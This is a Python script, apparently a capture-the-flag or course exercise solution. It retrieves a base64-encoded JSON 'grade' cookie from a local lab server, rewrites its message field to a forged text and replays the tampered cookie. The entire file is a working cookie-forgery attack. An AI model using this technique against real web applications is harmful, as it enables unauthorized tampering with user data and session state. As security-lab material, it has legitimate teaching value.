import base64
import binascii
import json
import requests

url = "http://127.0.0.1:5000/"

# Get the auth token cookie
response = requests.get(url)
if response.status_code == 200:
    grade_cookie = response.cookies.get("grade")
    if not grade_cookie:
        print("Grade not found in the cookies.")
        exit()
    print("Grade retrieved")
else:
    print("Failed to retrieve the URL. Status code:", response.status_code)
    exit()

# Fix Base64 padding
def fix_padding(b64_string):
    return b64_string + "=" * (-len(b64_string) % 4)

# Decode the cookie
try:
    decoded = base64.urlsafe_b64decode(fix_padding(grade_cookie)).decode()
    data = json.loads(decoded)  # Load the JSON data
except (binascii.Error, json.JSONDecodeError) as e:
    print(f"Decoding error: {e}")
    exit()

# Replace the message with your custom message
new_msg = "You get a get a 12 in System Security. I am very proud of you."

# Convert new message to hex
new_msg_hex = binascii.hexlify(new_msg.encode()).decode()

# Update the JSON data
data["msg"] = new_msg_hex

# Encode the updated JSON data back to Base64
encoded_data = base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

# Set the new cookie
cookies = {"grade": encoded_data}

# Disable redirects
response = requests.get(url, cookies=cookies, allow_redirects=False)
if response.status_code == 200:
    print("Successfully updated the cookie with the new message.")
else:
    print("Failed to update the cookie. Status code:", response.status_code)
